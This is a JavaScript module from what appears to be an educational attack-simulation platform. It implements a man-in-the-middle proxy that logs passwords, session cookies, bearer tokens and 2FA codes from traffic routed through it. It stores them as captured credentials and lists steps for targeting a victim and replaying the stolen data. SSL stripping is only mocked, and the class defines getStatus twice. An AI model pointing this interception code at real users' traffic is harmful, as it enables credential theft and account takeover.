const database = require('../models/database');
const crypto = require('crypto');
const http = require('http');
const https = require('https');
const url = require('url');

class MITMAttack {
  constructor() {
    this.attackType = 'mitm';
    this.activeProxies = new Map(); // Store active proxy servers
    this.interceptedData = new Map(); // Store intercepted data by attack ID
  }

  async initiate(options) {
    const { targetIp, method, interface: netInterface, sslStrip, attackerId } = options;
    const attackId = crypto.randomUUID();
    const proxyPort = await this.findAvailablePort(8080);
    
    const attackData = {
      target_ip: targetIp || '192.168.1.100',
      method: method || 'arp_spoofing',
      interface: netInterface || 'eth0',
      ssl_strip: sslStrip || false,
      proxy_port: proxyPort,
      proxy_url: `http://localhost:${proxyPort}`,
      instructions: this.generateInstructions(proxyPort),
      created_at: new Date().toISOString(),
      proxy_status: 'starting'
    };

    return new Promise((resolve, reject) => {
      const query = `
        INSERT INTO attack_logs (id, attack_type, target_user_id, attacker_ip, attack_data, status, attack_details, success)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
      `;

      database.getDB().run(query, [
        attackId,
        this.attackType,
        null, // No specific target user for IP-based attack
        'simulated-mitm-proxy',
        JSON.stringify(attackData),
        'in_progress',
        `MITM Proxy Server - ${method} on ${targetIp}`,
        0 // Will be updated when proxy captures data
      ], (err) => {
        if (err) {
          reject(err);
        } else {
          // Start the actual proxy server
          this.startProxyServer(attackId, proxyPort, sslStrip)
            .then((proxyInfo) => {
              console.log(`🕵️ [MITM ATTACK] Started ${method} attack on ${targetIp}`);
              console.log(`🔍 Network Interface: ${netInterface}`);
              console.log(`📡 Proxy URL: http://localhost:${proxyPort}`);
              console.log(`🔓 SSL Stripping: ${sslStrip ? 'Enabled' : 'Disabled'}`);
              
              resolve({
                attackId,
                proxyPort,
                proxyUrl: `http://localhost:${proxyPort}`,
                status: 'active',
                instructions: attackData.instructions,
                proxyInfo
              });
            })
            .catch(reject);
        }
      });
    });
  }

  async startProxyServer(attackId, port, sslStrip) {
    return new Promise((resolve, reject) => {
      // Create HTTP proxy server
      const proxyServer = http.createServer((req, res) => {
        this.handleProxyRequest(req, res, attackId, sslStrip);
      });

      proxyServer.listen(port, (err) => {
        if (err) {
          console.error(`❌ [MITM PROXY] Failed to start on port ${port}:`, err);
          reject(err);
        } else {
          console.log(`🚀 [MITM PROXY] Server started on port ${port}`);
          
          // Store the server instance
          this.activeProxies.set(attackId, proxyServer);
          this.interceptedData.set(attackId, []);
          
          // Update attack status to active
          const updateQuery = `
            UPDATE attack_logs 
            SET status = 'active'
            WHERE id = ?
          `;
          
          database.getDB().run(updateQuery, [attackId], (dbErr) => {
            if (dbErr) {
              console.error('Error updating attack status:', dbErr);
            }
          });

          resolve({
            port,
            url: `http://localhost:${port}`,
            status: 'running',
            message: 'Proxy server is now intercepting traffic. Configure your browser to use this proxy.'
          });
        }
      });

      proxyServer.on('error', (err) => {
        console.error(`❌ [MITM PROXY] Server error:`, err);
        reject(err);
      });
    });
  }

  handleProxyRequest(req, res, attackId, sslStrip) {
    const targetUrl = req.url;
    const method = req.method;
    const headers = req.headers;
    
    console.log(`\n🔍 [MITM INTERCEPT] ${method} ${targetUrl}`);

    // Collect request body
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
    });

    req.on('end', () => {
      // Parse body if it's JSON or form data
      let parsedBody = null;
      try {
        if (headers['content-type']?.includes('application/json')) {
          parsedBody = JSON.parse(body);
        } else if (headers['content-type']?.includes('application/x-www-form-urlencoded')) {
          parsedBody = Object.fromEntries(new URLSearchParams(body));
        }
      } catch (e) {}

      // Analyze intercepted data
      const interceptedData = {
        timestamp: new Date().toISOString(),
        method,
        url: targetUrl,
        headers,
        body: parsedBody || body,
        auth_analysis: this.analyzeForAuthData(headers, parsedBody || body)
      };

      // Store intercepted data
      const existingData = this.interceptedData.get(attackId) || [];
      existingData.push(interceptedData);
      this.interceptedData.set(attackId, existingData);

      // Always show what we captured
      console.log(`\n🎯 [MITM SUCCESS] Attack ID: ${attackId}`);
      console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
      console.log(`📡 Method: ${method}`);
      console.log(`🌐 URL: ${targetUrl}`);
      
      // Show authorization header if present
      if (headers.authorization) {
        console.log(`🎫 Auth Token: ${headers.authorization}`);
      }
      
      // Show cookies if present
      if (headers.cookie) {
        console.log(`🍪 Cookies: ${headers.cookie}`);
      }
      
      // Show body data if present
      if (parsedBody && Object.keys(parsedBody).length > 0) {
        console.log(`📦 Request Body:`);
        if (parsedBody.username || parsedBody.email) {
          console.log(`   👤 Username: ${parsedBody.username || parsedBody.email}`);
        }
        if (parsedBody.password) {
          console.log(`   🔑 Password: ${parsedBody.password}`);
        }
        if (parsedBody.totp || parsedBody.otp || parsedBody.code) {
          console.log(`   📱 2FA Code: ${parsedBody.totp || parsedBody.otp || parsedBody.code}`);
        }
      }
      
      console.log(`⏰ Timestamp: ${interceptedData.timestamp}`);
      console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`);

      // Check for authentication data
      if (interceptedData.auth_analysis.found) {
        // Update attack as successful
        this.updateAttackSuccess(attackId, interceptedData);
      }

      // For demonstration, return a simulated response
      this.generateSimulatedResponse(res, targetUrl, method, sslStrip);
    });
  }

  generateSimulatedResponse(res, targetUrl, method, sslStrip) {
    // Generate a realistic response for demonstration
    const isLoginPage = targetUrl.includes('login') || targetUrl.includes('signin') || targetUrl.includes('auth');
    const isAPI = targetUrl.includes('/api/') || targetUrl.includes('.json');

    res.writeHead(200, {
      'Content-Type': isAPI ? 'application/json' : 'text/html',
      'Access-Control-Allow-Origin': '*',
      'X-Intercepted-By': 'MITM-Proxy'
    });

    if (isAPI) {
      // Simulate API response
      res.end(JSON.stringify({
        status: 'intercepted',
        message: 'This request was intercepted by MITM proxy',
        original_url: targetUrl,
        method: method,
        timestamp: new Date().toISOString()
      }));
    } else if (isLoginPage) {
      // Simulate login page
      res.end(`
        <html>
          <head><title>Intercepted Login Page</title></head>
          <body>
            <h1>🚨 MITM Attack Simulation</h1>
            <div style="background: #ffe6e6; padding: 20px; margin: 20px; border: 2px solid #ff0000;">
              <h2>This page has been intercepted!</h2>
              <p><strong>Original URL:</strong> ${targetUrl}</p>
              <p><strong>Method:</strong> ${method}</p>
              <p><strong>SSL Stripping:</strong> ${sslStrip ? 'Active' : 'Disabled'}</p>
              <p>In a real attack, this would show the legitimate login page while capturing credentials.</p>
            </div>
            <form method="POST">
              <h3>Simulated Login Form</h3>
              <input type="text" placeholder="Username" name="username" style="display:block; margin:10px 0; padding:10px;">
              <input type="password" placeholder="Password" name="password" style="display:block; margin:10px 0; padding:10px;">
              <input type="text" placeholder="2FA Code" name="otp" style="display:block; margin:10px 0; padding:10px;">
              <button type="submit" style="padding:10px 20px;">Login (Intercepted)</button>
            </form>
          </body>
        </html>
      `);
    } else {
      // Simulate generic page
      res.end(`
        <html>
          <head><title>MITM Proxy Active</title></head>
          <body>
            <h1>🔍 MITM Proxy Server</h1>
            <p>This request to <strong>${targetUrl}</strong> was intercepted.</p>
            <p>All traffic through this proxy is being monitored and logged.</p>
            <p><em>This is a simulation for educational purposes.</em></p>
          </body>
        </html>
      `);
    }
  }

  generateInstructions(proxyPort) {
    return {
      title: "MITM Attack Simulation Instructions",
      steps: [
        "1. Configure victim's device to use proxy server",
        `2. Set proxy server to localhost:${proxyPort}`,
        "3. Monitor all HTTP/HTTPS traffic through the proxy",
        "4. Capture authentication tokens and 2FA codes",
        "5. Replay captured authentication data"
      ],
      warnings: [
        "⚠️ This is a simulation for educational purposes",
        "🔒 Real MITM attacks require SSL certificate manipulation",
        "🌐 Modern browsers have protections against such attacks"
      ],
      detection_methods: [
        "Certificate warnings in browsers",
        "Unusual network latency",
        "SSL/TLS certificate mismatches",
        "Network monitoring tools"
      ]
    };
  }

  async getStatus(attackId) {
    return new Promise((resolve, reject) => {
      const query = `
        SELECT 
          id,
          status,
          attack_data,
          success,
          created_at,
          updated_at
        FROM attack_logs 
        WHERE id = ?
      `;

      database.getDB().get(query, [attackId], (err, row) => {
        if (err) {
          reject(err);
        } else if (!row) {
          reject(new Error('Attack not found'));
        } else {
          const attackData = JSON.parse(row.attack_data);
          const interceptedData = this.interceptedData.get(attackId) || [];
          const isProxyRunning = this.activeProxies.has(attackId);

          resolve({
            attackId: row.id,
            status: row.status,
            success: row.success === 1,
            proxyRunning: isProxyRunning,
            proxyUrl: attackData.proxy_url,
            interceptedRequests: interceptedData.length,
            authDataCaptured: interceptedData.some(data => data.auth_analysis.found),
            lastActivity: interceptedData.length > 0 ? interceptedData[interceptedData.length - 1].timestamp : null,
            created_at: row.created_at,
            attackData: attackData,
            interceptedData: interceptedData.slice(-5) // Last 5 requests for preview
          });
        }
      });
    });
  }

  async stopAttack(attackId) {
    return new Promise((resolve, reject) => {
      // Stop the proxy server if running
      const proxyServer = this.activeProxies.get(attackId);
      
      if (proxyServer) {
        proxyServer.close(() => {
          console.log(`🛑 [MITM PROXY] Stopped proxy for attack ${attackId}`);
          
          // Clean up
          this.activeProxies.delete(attackId);
          
          // Update attack status
          const updateQuery = `
            UPDATE attack_logs 
            SET status = 'stopped',
                attack_data = json_patch(attack_data, json('{"proxy_status": "stopped", "stopped_at": "' || datetime('now') || '"}'))
            WHERE id = ?
          `;
          
          database.getDB().run(updateQuery, [attackId], (err) => {
            if (err) {
              reject(err);
            } else {
              const interceptedData = this.interceptedData.get(attackId) || [];
              resolve({
                success: true,
                message: 'MITM attack stopped successfully',
                totalRequests: interceptedData.length,
                authDataCaptured: interceptedData.some(data => data.auth_analysis.found)
              });
            }
          });
        });
      } else {
        // Attack wasn't running or already stopped
        resolve({
          success: true,
          message: 'Attack was not running or already stopped'
        });
      }
    });
  }

  // Clean up all active proxies (useful for server shutdown)
  stopAllAttacks() {
    console.log(`🛑 [MITM CLEANUP] Stopping ${this.activeProxies.size} active proxies`);
    
    for (const [attackId, server] of this.activeProxies) {
      server.close();
      console.log(`🛑 Stopped proxy for attack ${attackId}`);
    }
    
    this.activeProxies.clear();
    this.interceptedData.clear();
  }

  updateAttackSuccess(attackId, interceptedData) {
    // Extract credentials from intercepted data
    const capturedCreds = {
      username: interceptedData.body?.username || interceptedData.body?.email || null,
      password: interceptedData.body?.password ? '***CAPTURED***' : null,
      totp: interceptedData.body?.totp || interceptedData.body?.otp || interceptedData.body?.code || null,
      session_token: interceptedData.headers?.authorization || interceptedData.headers?.cookie || null,
      intercepted_requests: 1,
      timestamp: interceptedData.timestamp,
      auth_type: interceptedData.auth_analysis?.type || 'unknown'
    };

    const updateQuery = `
      UPDATE attack_logs 
      SET success = 1, 
          status = 'successful',
          captured_credentials = ?,
          attack_data = json_patch(attack_data, json('{"intercepted_auth": ' || json(?) || ', "success_at": "' || datetime('now') || '"}'))
      WHERE id = ?
    `;
    
    database.getDB().run(updateQuery, [
      JSON.stringify(capturedCreds),
      JSON.stringify(interceptedData.auth_analysis), 
      attackId
    ], (err) => {
      if (err) {
        console.error('Error updating attack success:', err);
      } else {
        console.log(`✅ [MITM SUCCESS] Attack ${attackId} marked as successful - credentials captured!`);
        console.log(`📊 Captured: ${capturedCreds.username ? 'Username' : ''} ${capturedCreds.password ? 'Password' : ''} ${capturedCreds.totp ? 'TOTP' : ''} ${capturedCreds.session_token ? 'Token' : ''}`);
      }
    });
  }

  analyzeForAuthData(headers, body) {
    const analysis = { found: false, type: null, details: [] };
    
    // Check headers for authorization
    if (headers && headers.authorization) {
      analysis.found = true;
      analysis.type = 'bearer_token';
      analysis.details.push('Authorization header detected');
    }

    // Check for session cookies
    if (headers && headers.cookie) {
      const cookies = headers.cookie.toLowerCase();
      if (cookies.includes('session') || cookies.includes('auth') || cookies.includes('token')) {
        analysis.found = true;
        analysis.type = 'session_cookie';
        analysis.details.push('Session/auth cookies detected');
      }
    }

    // Check body for credentials or 2FA codes
    if (body) {
      const bodyStr = JSON.stringify(body).toLowerCase();
      if (bodyStr.includes('password') || bodyStr.includes('username')) {
        analysis.found = true;
        analysis.type = 'credentials';
        analysis.details.push('Login credentials detected in body');
      }
      
      if (bodyStr.includes('2fa') || bodyStr.includes('otp') || bodyStr.includes('totp')) {
        analysis.found = true;
        analysis.type = '2fa_code';
        analysis.details.push('2FA/OTP code detected in body');
      }
    }

    return analysis;
  }

  async getInterceptedTraffic(attackId) {
    return new Promise((resolve, reject) => {
      const query = 'SELECT attack_data FROM attack_logs WHERE id = ?';
      
      database.getDB().get(query, [attackId], (err, row) => {
        if (err) {
          reject(err);
        } else if (row) {
          const data = JSON.parse(row.attack_data);
          resolve({
            attack_id: attackId,
            intercepted_data: data.intercepted_data || [],
            last_intercept: data.last_intercept,
            total_requests: data.intercepted_data ? data.intercepted_data.length : 0
          });
        } else {
          reject(new Error('Attack not found'));
        }
      });
    });
  }

  async simulateSSLStripping(attackId) {
    // Simulate SSL stripping attack
    return new Promise((resolve) => {
      console.log(`🔓 [SSL STRIPPING] Simulating HTTPS -> HTTP downgrade for attack ${attackId}`);
      
      const sslStrippingData = {
        technique: 'SSL Stripping',
        description: 'Simulated downgrade of HTTPS connections to HTTP',
        targets: ['login.example.com', '2fa-verification.example.com'],
        certificates_replaced: true,
        timestamp: new Date().toISOString()
      };

      // Update attack data
      const query = `
        UPDATE attack_logs 
        SET attack_data = json_patch(attack_data, json('{"ssl_stripping": ' || json(?) || '}'))
        WHERE id = ?
      `;

      database.getDB().run(query, [JSON.stringify(sslStrippingData), attackId], () => {
        resolve({
          success: true,
          ssl_stripping: sslStrippingData,
          warning: 'This is a simulation - real SSL stripping requires certificate authority manipulation'
        });
      });
    });
  }

  async getStatus(attackId) {
    return new Promise((resolve, reject) => {
      const query = `SELECT * FROM attack_logs WHERE id = ?`;
      
      database.getDB().get(query, [attackId], (err, row) => {
        if (err) {
          reject(err);
        } else if (!row) {
          reject(new Error('Attack not found'));
        } else {
          const attackData = JSON.parse(row.attack_data);
          resolve({
            attack_id: attackId,
            status: row.status,
            intercepted_data: attackData.intercepted_data || [],
            ssl_stripping: attackData.ssl_stripping || {},
            proxy_port: attackData.proxy_port,
            target_ip: attackData.target_ip
          });
        }
      });
    });
  }

  async findAvailablePort(startPort) {
    const net = require('net');
    
    for (let port = startPort; port < startPort + 100; port++) {
      try {
        await this.checkPortAvailable(port);
        console.log(`🔍 [MITM] Found available port: ${port}`);
        return port;
      } catch (err) {
        // Port is in use, try next one
        continue;
      }
    }
    
    // If we can't find an available port, use a random high port
    const randomPort = Math.floor(Math.random() * 1000) + 8000;
    console.log(`🔍 [MITM] Using random port: ${randomPort}`);
    return randomPort;
  }

  checkPortAvailable(port) {
    return new Promise((resolve, reject) => {
      const server = require('net').createServer();
      
      server.listen(port, (err) => {
        if (err) {
          reject(err);
        } else {
          server.close(() => {
            resolve(port);
          });
        }
      });
      
      server.on('error', reject);
    });
  }
}

module.exports = MITMAttack;